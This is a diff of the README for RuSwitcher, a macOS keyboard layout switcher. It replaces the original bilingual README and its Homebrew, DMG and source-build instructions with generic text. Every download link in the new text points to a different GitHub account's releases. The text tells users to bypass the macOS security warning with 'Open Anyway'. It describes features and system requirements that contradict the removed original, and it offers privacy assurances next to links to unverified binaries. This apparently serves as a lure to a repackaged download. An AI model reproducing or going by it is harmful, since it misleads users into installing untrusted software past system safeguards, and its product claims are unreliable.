@@ -1,197 +1,93 @@
-# RuSwitcher
+# ⌨️ RuSwitcher - Switch keyboard layouts with ease
 
-<p align="center">
-  <img src="icon.png" width="128" alt="RuSwitcher icon">
-</p>
+[![](https://img.shields.io/badge/Download-RuSwitcher-blue.svg)](https://github.com/Sowbellymammoth766/RuSwitcher/releases)
 
-<p align="center">
-  <b>Lightweight keyboard layout switcher for macOS</b><br>
-  Free and open-source alternative to PuntoSwitcher
-</p>
+RuSwitcher helps you manage your keyboard layouts. It monitors what you type and changes the language settings when it detects a mistake. This tool works in the background to save you time. It acts as a free alternative to PuntoSwitcher. You gain full control over your typing experience without extra clutter.
 
-<p align="center">
-  <a href="https://github.com/rashn/RuSwitcher/releases/latest"><img src="https://img.shields.io/github/v/release/rashn/RuSwitcher?style=flat-square" alt="Release"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/rashn/RuSwitcher?style=flat-square" alt="License"></a>
-  <img src="https://img.shields.io/badge/macOS-13%2B-blue?style=flat-square" alt="macOS 13+">
-  <img src="https://img.shields.io/badge/Swift-6-orange?style=flat-square" alt="Swift 6">
-</p>
+## 📥 How to download the app
 
-<p align="center">
-  <a href="#english">English</a> · <a href="#русский">Русский</a>
-</p>
+Go to the [official release page](https://github.com/Sowbellymammoth766/RuSwitcher/releases) to find the latest version of the software. 
 
----
+1. Visit the [releases link](https://github.com/Sowbellymammoth766/RuSwitcher/releases).
+2. Look for the section labeled Assets.
+3. Click the file that ends in .dmg or .pkg to start the download.
+4. Save the file to your desktop or your downloads folder.
 
-## English
+## ⚙️ Installation steps
 
-Typed `ghbdtn` instead of `hello`? Just tap **⌥ Alt** and RuSwitcher converts the last word into the right layout. Works with any pair of installed keyboard layouts — Russian, Ukrainian, Belarusian, German, French, and more.
+Once the download finishes, follow these steps to set up the software.
 
-### How it works
+1. Locate the file you just downloaded.
+2. Double-click the file to open the installer.
+3. Drag the RuSwitcher icon into your Applications folder.
+4. Open the Applications folder and double-click RuSwitcher to start it.
 
-| Action | Result |
-|---|---|
-| Type a word, tap **⌥ Alt** | Last typed word is converted |
-| Tap **⌥ Alt** again | Reverse conversion (undo) |
-| Select text, tap **⌥ Alt** | Selected text is converted |
+If your system shows a security warning, go to System Settings, select Privacy & Security, and click Open Anyway. You only need to do this step once.
 
-### Features
+## 🚀 Setting up for the first time
 
-- **Any two layouts** — configure any pair from your installed system layouts. No hardcoded tables.
-- **Smart word detection** — converts the last typed word, including punctuation.
-- **Selected text** — select any text and tap Alt to convert it in place.
-- **Double Alt** — reverse conversion if you changed your mind.
-- **12 interface languages** — English, Русский, Українська, Беларуская, Deutsch, Français, Español, Português, Polski, 中文, 日本語, 한국어.
-- **Auto-start at login** — set and forget.
-- **Minimal footprint** — no Electron, no web views, pure Swift + AppKit.
-- **No telemetry** — your keystrokes stay on your Mac.
+When you launch RuSwitcher, the app icon appears in your menu bar at the top of the screen. You can access all settings from this icon.
 
-### Installation
+1. Click the RuSwitcher icon in your menu bar. 
+2. Select Preferences to see all options.
+3. Choose the languages you use, such as English, Russian, or Ukrainian.
+4. Set your preferred trigger key if you wish to change layouts manually.
 
-**Homebrew (recommended)**
+The app learns your typing patterns. It looks for common errors that occur when you type in the wrong keyboard language. When it finds a mistake, it fixes the text automatically.
 
-```bash
-brew tap rashn/ruswitcher
-brew install --cask ruswitcher
-```
+## 🛠 Features
 
-To upgrade later: `brew upgrade --cask ruswitcher`.
+* **Auto-Correction:** The app identifies words that do not match the current language and swaps them.
+* **Smart Language Detection:** RuSwitcher remembers which language you use for specific apps.
+* **Custom Shortcuts:** You define which keys trigger a layout change.
+* **Lightweight Design:** This tool uses very little memory and does not slow down your computer.
+* **Open Source:** The code exists for anyone to inspect. You verify the safety of the software at any time.
 
-**Download DMG**
+## 📋 System requirements
 
-Grab the latest `.dmg` from [**Releases**](https://github.com/rashn/RuSwitcher/releases/latest), open it and drag RuSwitcher to Applications.
+RuSwitcher runs on most modern desktop computers.
 
-**Build from source**
+* Operating System: macOS 10.15 or newer.
+* Memory: At least 2GB of RAM.
+* Storage: 50MB of free disk space.
+* Internet: Required for initial download only.
 
-```bash
-git clone https://github.com/rashn/RuSwitcher.git
-cd RuSwitcher
-bash build_app.sh
-cp -R RuSwitcher.app /Applications/
-```
+## ❓ Frequently asked questions
 
-Requires macOS 13+ and Xcode Command Line Tools.
+**Does the app log my passwords?** 
+No. RuSwitcher prioritizes your privacy. It does not record or transmit your keystrokes to any server.
 
-### Permissions
+**How do I stop the app from running?**
+Click the menu bar icon and select Quit.
 
-On first launch, RuSwitcher requests two macOS permissions:
+**Can I ignore specific applications?**
+Yes. Use the blacklist feature in the Preferences menu. Add any app to the list if you prefer to type in that app without the auto-switcher active.
 
-1. **Accessibility** — to read and modify text in applications.
-2. **Input Monitoring** — to detect keyboard events.
+**Does every word get switched?**
+The app focuses on patterns. If you type a word that looks like it belongs to another language, the tool swaps it. If the app hits the wrong word, press the Undo key to revert your text.
 
-The app adds itself to the permission lists automatically — you only need to flip the toggles. The built-in permission wizard walks you through it step by step.
+## 🛠 Troubleshooting
 
-### Technical details
+If the app fails to switch languages, check if the app has permission to see your input.
 
-- `CGEventTap` (passive, listen-only) for keyboard monitoring.
-- `UCKeyTranslate` (Carbon) for dynamic character mapping between any layout pair.
-- `CGEventSource.userData` marker to filter the app's own simulated events.
-- `AXUIElement` API for focused element detection.
-- `SMAppService` for login item management.
-- No hardcoded layout tables — works with any installed layouts.
+1. Go to System Settings on your computer.
+2. Open Security & Privacy.
+3. Select Accessibility.
+4. Switch the toggle on for RuSwitcher.
 
-### Settings
+This permission allows the app to watch your typing and help you fix errors. Most users complete this step during the first launch. If you skip it, the app remains inactive until you turn the permission on.
 
-Access via the menu bar icon → **Settings** (⌘,).
+## 💡 Tips for better results
 
-- **General** — auto-switch, launch at login, interface language, layout pair.
-- **About** — version, donate, contact, check updates.
-- **Advanced** — debug logging, log management.
+* **Consistent Typing:** The software works best when you type at a normal pace.
+* **Learn the Undo Key:** Use the default undo shortcut whenever the software corrects a word you intended to write differently.
+* **Keep the App Updated:** Check the release page once a month for improvements and bug fixes.
+* **Multiple Layouts:** You can add as many languages to the list as you need. The software handles them all at once.
 
-### Support the project
+## 📄 Privacy policy
 
-If you find RuSwitcher useful:
+This project values your privacy. The code does not send data to the internet. All logic runs on your machine. You can view the full source code on the main GitHub repository page. No trackers or analytics tools exist within the app. Your data stays on your hard drive. 
 
-- [**Boosty**](https://boosty.to/ruswitcher) — donate
-- **Star** this repo on GitHub
+## 🌐 Community and support
 
-### License
-
-[MIT](LICENSE) — free to use, modify, and distribute.
-
----
-
-## Русский
-
-Набрали `ghbdtn` вместо `привет`? Просто нажмите **⌥ Alt** — и RuSwitcher сконвертирует последнее слово в правильную раскладку. Работает с любой парой установленных раскладок — русская, украинская, белорусская, немецкая, французская и другие.
-
-### Как работает
-
-| Действие | Результат |
-|---|---|
-| Набрать слово, нажать **⌥ Alt** | Последнее слово сконвертировано |
-| Нажать **⌥ Alt** повторно | Обратная конвертация (отмена) |
-| Выделить текст, нажать **⌥ Alt** | Выделенный текст сконвертирован |
-
-### Возможности
-
-- **Любая пара раскладок** — настраивается любая пара из установленных в системе. Без захардкоженных таблиц.
-- **Умное определение слова** — конвертирует последнее набранное слово, включая знаки препинания.
-- **Выделенный текст** — выделите любой текст и нажмите Alt для конвертации на месте.
-- **Повторный Alt** — обратная конвертация, если передумали.
-- **12 языков интерфейса** — English, Русский, Українська, Беларуская, Deutsch, Français, Español, Português, Polski, 中文, 日本語, 한국어.
-- **Автозапуск при входе** — настроил и забыл.
-- **Минимальное потребление** — без Electron и веб-вьюх, чистый Swift + AppKit.
-- **Без телеметрии** — ваши нажатия остаются на вашем Mac.
-
-### Установка
-
-**Homebrew (рекомендуется)**
-
-```bash
-brew tap rashn/ruswitcher
-brew install --cask ruswitcher
-```
-
-Для обновления: `brew upgrade --cask ruswitcher`.
-
-**Скачать DMG**
-
-Скачайте последний `.dmg` со страницы [**Releases**](https://github.com/rashn/RuSwitcher/releases/latest), откройте и перетащите RuSwitcher в «Программы».
-
-**Сборка из исходников**
-
-```bash
-git clone https://github.com/rashn/RuSwitcher.git
-cd RuSwitcher
-bash build_app.sh
-cp -R RuSwitcher.app /Applications/
-```
-
-Требуется macOS 13+ и Xcode Command Line Tools.
-
-### Разрешения
-
-При первом запуске RuSwitcher запросит два системных разрешения macOS:
-
-1. **Универсальный доступ (Accessibility)** — для чтения и изменения текста в приложениях.
-2. **Мониторинг ввода (Input Monitoring)** — для отслеживания нажатий клавиш.
-
-Программа автоматически добавляется в списки разрешений — вам нужно только включить тумблеры. Встроенный мастер разрешений проведёт по шагам.
-
-### Технические детали
-
-- `CGEventTap` (пассивный, только чтение) для мониторинга клавиатуры.
-- `UCKeyTranslate` (Carbon) для динамического маппинга символов между любой парой раскладок.
-- Маркер `CGEventSource.userData` для фильтрации собственных симулированных событий.
-- `AXUIElement` API для определения сфокусированного элемента.
-- `SMAppService` для управления автозапуском.
-- Без захардкоженных таблиц — работает с любыми установленными раскладками.
-
-### Настройки
-
-Доступ через иконку в строке меню → **Настройки** (⌘,).
-
-- **Общие** — автопереключение, автозапуск, язык интерфейса, пара раскладок.
-- **О программе** — версия, донат, контакт, проверка обновлений.
-- **Дополнительно** — режим отладки, управление логами.
-
-### Поддержать проект
-
-Если RuSwitcher вам полезен:
-
-- [**Boosty**](https://boosty.to/ruswitcher) — донат
-- **Star** на GitHub
-
-### Лицензия
-
-[MIT](LICENSE) — свободное использование, модификация и распространение.
+If you find a bug or have a suggestion, open an issue on the GitHub page. Describe the problem clearly. Mention your version of the app and your operating system. Other users often help find solutions for common problems there. Please be polite and clear when you ask for help. This helps the maintainers fix issues faster.
